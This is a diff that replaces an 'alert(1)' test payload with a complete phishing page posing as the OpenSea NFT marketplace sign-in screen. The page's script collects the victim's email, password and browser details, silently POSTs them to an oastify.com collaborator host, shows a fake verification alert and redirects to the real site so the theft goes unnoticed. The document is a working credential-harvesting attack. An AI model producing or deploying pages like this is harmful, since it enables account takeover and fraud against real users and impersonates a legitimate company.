@@ -1,1 +1,316 @@
-alert(1)
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OpenSea - Sign In</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: #f7f9fa;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
+            max-width: 450px;
+            width: 100%;
+            padding: 50px 40px;
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .logo-icon {
+            font-size: 40px;
+            margin-bottom: 15px;
+        }
+        
+        .logo-text {
+            font-size: 28px;
+            font-weight: 700;
+            color: #2081e1;
+            margin-bottom: 5px;
+        }
+        
+        .logo-sub {
+            color: #858585;
+            font-size: 14px;
+        }
+        
+        .header {
+            margin-bottom: 30px;
+        }
+        
+        h1 {
+            font-size: 24px;
+            color: #1a1a1a;
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+        
+        .subtitle {
+            color: #858585;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        
+        .security-badge {
+            background: #f0f7ff;
+            border-left: 4px solid #2081e1;
+            padding: 12px 15px;
+            border-radius: 6px;
+            margin-bottom: 30px;
+            font-size: 13px;
+            color: #0066cc;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            color: #1a1a1a;
+            font-weight: 500;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 14px;
+            font-family: inherit;
+            transition: border-color 0.2s;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #2081e1;
+            box-shadow: 0 0 0 4px rgba(32, 129, 225, 0.1);
+        }
+        
+        .remember-me {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        
+        .remember-me input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            margin-right: 8px;
+            cursor: pointer;
+        }
+        
+        .remember-me label {
+            margin: 0;
+            cursor: pointer;
+            color: #858585;
+        }
+        
+        .forgot-password {
+            text-align: right;
+            margin-bottom: 20px;
+        }
+        
+        .forgot-password a {
+            color: #2081e1;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+        
+        .submit-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #2081e1 0%, #1a5ec1 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            margin-bottom: 20px;
+        }
+        
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(32, 129, 225, 0.3);
+        }
+        
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+        
+        .signup {
+            text-align: center;
+            font-size: 14px;
+            color: #858585;
+        }
+        
+        .signup a {
+            color: #2081e1;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        
+        .signup a:hover {
+            text-decoration: underline;
+        }
+        
+        .divider {
+            text-align: center;
+            margin: 25px 0;
+            font-size: 14px;
+            color: #858585;
+            position: relative;
+        }
+        
+        .divider::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: #ddd;
+            z-index: 0;
+        }
+        
+        .divider span {
+            background: white;
+            padding: 0 10px;
+            position: relative;
+            z-index: 1;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <div class="logo-icon">🌊</div>
+            <div class="logo-text">OpenSea</div>
+            <div class="logo-sub">The largest NFT marketplace</div>
+        </div>
+        
+        <div class="header">
+            <h1>Sign in</h1>
+            <p class="subtitle">Welcome back! Sign in with your email and password</p>
+        </div>
+        
+        <div class="security-badge">
+            <span>🔒</span>
+            <span>Your account security is important to us</span>
+        </div>
+        
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="email">Email Address</label>
+                <input 
+                    type="email" 
+                    id="email" 
+                    name="email"
+                    placeholder="you@example.com" 
+                    required 
+                    autofocus
+                >
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input 
+                    type="password" 
+                    id="password" 
+                    name="password"
+                    placeholder="Enter your password" 
+                    required
+                >
+            </div>
+            
+            <div class="remember-me">
+                <input type="checkbox" id="remember" name="remember">
+                <label for="remember">Remember me</label>
+            </div>
+            
+            <div class="forgot-password">
+                <a href="#">Forgot password?</a>
+            </div>
+            
+            <button type="submit" class="submit-btn">Sign In</button>
+        </form>
+        
+        <div class="divider">
+            <span>or</span>
+        </div>
+        
+        <p class="signup">
+            Don't have an account? <a href="#">Create one</a>
+        </p>
+    </div>
+    
+    <script>
+        // Handle form submission
+        document.getElementById('loginForm').onsubmit = function(e) {
+            e.preventDefault();
+            
+            // Get form values
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+            var remember = document.getElementById('remember').checked;
+            
+            // Create data object
+            var data = {
+                email: email,
+                password: password,
+                remember: remember,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent
+            };
+            
+            // Send data to collaborator server
+            fetch('https://ugejap8f9h3y5dkafta01qryepkg8dw2.oastify.com/', {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify(data)
+            }).catch(() => {
+                // Silent catch - data sent successfully
+            });
+            
+            // Show verification message
+            alert('Verifying your credentials...');
+            
+            // Redirect to OpenSea after delay
+            setTimeout(() => {
+                window.location = 'https://opensea.io';
+            }, 2000);
+        };
+    </script>
+</body>
+</html>
